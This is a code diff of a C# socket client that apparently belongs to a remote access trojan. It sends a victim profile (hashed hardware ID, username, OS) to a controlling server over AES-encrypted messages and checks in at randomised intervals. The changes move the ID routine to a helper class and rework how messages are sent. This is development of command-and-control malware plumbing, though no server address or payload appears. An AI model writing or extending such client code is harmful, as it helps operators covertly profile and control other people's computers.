@@ -8,6 +8,7 @@ using System.Text;
 using System.Threading;
 using System.Security.Cryptography;
 using Client.Handle_Packet;
+using Client.Helper;
 
 namespace Client.Sockets
 {
@@ -22,6 +23,7 @@ namespace Client.Sockets
         private static Timer Tick { get; set; }
         private static MemoryStream MS { get; set; }
         private static object SendSync { get; set; }
+        private static object EndSendSync { get; set; }
         public static bool Connected { get; set; }
 
         public static void InitializeClient()
@@ -44,6 +46,7 @@ namespace Client.Sockets
                 BufferRecevied = false;
                 MS = new MemoryStream();
                 SendSync = new object();
+                EndSendSync = new object();
                 BeginSend(SendInfo());
                 TimerCallback T = CheckServer;
                 Tick = new Timer(T, null, new Random().Next(30 * 1000, 60 * 1000), new Random().Next(30 * 1000, 60 * 1000));
@@ -52,7 +55,6 @@ namespace Client.Sockets
             catch
             {
                 Debug.WriteLine("Disconnected!");
-                Thread.Sleep(new Random().Next(1 * 1000, 6 * 1000));
                 Connected = false;
             }
         }
@@ -76,7 +78,7 @@ namespace Client.Sockets
         {
             MsgPack msgpack = new MsgPack();
             msgpack.ForcePathObject("Packet").AsString = "ClientInfo";
-            msgpack.ForcePathObject("HWID").AsString = HWID();
+            msgpack.ForcePathObject("HWID").AsString = Methods.HWID();
             msgpack.ForcePathObject("User").AsString = Environment.UserName.ToString();
             msgpack.ForcePathObject("OS").AsString = new ComputerInfo().OSFullName.ToString().Replace("Microsoft", null) + " " +
                 Environment.Is64BitOperatingSystem.ToString().Replace("True", "64bit").Replace("False", "32bit");
@@ -85,28 +87,7 @@ namespace Client.Sockets
             return msgpack.Encode2Bytes();
         }
 
-        private static string HWID()
-        {
-            StringBuilder sb = new StringBuilder();
-            sb.Append(Environment.UserDomainName);
-            sb.Append(Environment.UserName);
-            sb.Append(Environment.MachineName);
-            sb.Append(Environment.Version);
-            return GetHash(sb.ToString());
-        }
-
-        private static string GetHash(string strToHash)
-        {
-            MD5CryptoServiceProvider md5Obj = new MD5CryptoServiceProvider();
-            byte[] bytesToHash = Encoding.ASCII.GetBytes(strToHash);
-            bytesToHash = md5Obj.ComputeHash(bytesToHash);
-            StringBuilder strResult = new StringBuilder();
-            foreach (byte b in bytesToHash)
-                strResult.Append(b.ToString("x2"));
-            return strResult.ToString().Substring(0, 12).ToUpper();
-        }
-
-        public static void ReadServertData(IAsyncResult ar)
+        public static void ReadServertData(IAsyncResult Iar)
         {
             try
             {
@@ -116,14 +97,14 @@ namespace Client.Sockets
                     return;
                 }
 
-                int Recevied = Client.EndReceive(ar);
+                int Recevied = Client.EndReceive(Iar);
                 if (Recevied > 0)
                 {
                     if (BufferRecevied == false)
                         if (Buffer[0] == 0)
                         {
                             Buffersize = Convert.ToInt64(Encoding.UTF8.GetString(MS.ToArray()));
-                            Debug.WriteLine("///  Buffersize: " + Buffersize.ToString() + " Bytes  ///");
+                            Debug.WriteLine("/// Client Buffersize " + Buffersize.ToString() + " Bytes  ///");
                             MS.Dispose();
                             MS = new MemoryStream();
                             if (Buffersize > 0)
@@ -168,24 +149,14 @@ namespace Client.Sockets
         {
             lock (SendSync)
             {
-                if (!Client.Connected)
-                {
-                    Connected = false;
-                    return;
-                }
-
                 try
                 {
-                    using (MemoryStream MS = new MemoryStream())
-                    {
-                        byte[] buffer = Settings.aes256.Encrypt(Msg);
-                        byte[] buffersize = Encoding.UTF8.GetBytes(buffer.Length.ToString() + (char)0);
-                        MS.Write(buffersize, 0, buffersize.Length);
-                        MS.Write(buffer, 0, buffer.Length);
+                    byte[] buffer = Settings.aes256.Encrypt(Msg);
+                    byte[] buffersize = Encoding.UTF8.GetBytes(buffer.Length.ToString() + (char)0);
 
-                        Client.Poll(-1, SelectMode.SelectWrite);
-                        Client.BeginSend(MS.ToArray(), 0, (int)(MS.Length), SocketFlags.None, EndSend, null);
-                    }
+                    Client.Poll(-1, SelectMode.SelectWrite);
+                    Client.BeginSend(buffersize, 0, buffersize.Length, SocketFlags.None, EndSend, null);
+                    Client.BeginSend(buffer, 0, buffer.Length, SocketFlags.None, EndSend, null);
                 }
                 catch
                 {
@@ -197,14 +168,19 @@ namespace Client.Sockets
 
         public static void EndSend(IAsyncResult ar)
         {
-            try
+            lock (EndSendSync)
             {
-                Client.EndSend(ar);
-            }
-            catch
-            {
-                Connected = false;
-                return;
+                try
+                {
+                    int sent = 0;
+                    sent = Client.EndSend(ar);
+                    Debug.WriteLine("/// Client Sent " + sent.ToString() + " Bytes  ///");
+                }
+                catch
+                {
+                    Connected = false;
+                    return;
+                }
             }
         }
 
